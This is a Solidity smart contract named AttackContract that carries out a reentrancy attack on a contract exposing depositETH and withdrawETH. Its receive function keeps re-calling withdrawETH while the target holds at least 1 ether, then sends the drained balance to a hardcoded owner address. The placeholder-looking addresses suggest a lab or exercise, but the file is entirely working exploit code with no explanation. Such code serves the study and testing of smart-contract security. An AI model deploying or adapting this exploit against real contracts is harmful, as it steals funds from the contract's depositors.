// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyVulnerable {
    function depositETH() external payable;
    function withdrawETH() external;
}

contract AttackContract {
    IReentrancyVulnerable public constant vulnerableContract =
        IReentrancyVulnerable(0x7a46e70000000000000000000000000000000000);
    address payable constant owner =
        payable(0xCa11e40000000000000000000000000000000000);

    function attack(uint256 amount) external payable {
        vulnerableContract.depositETH{value: amount}();
        vulnerableContract.withdrawETH();
    }

    receive() external payable {
        // 1 ETH
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdrawETH();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    fallback() external payable {}
}
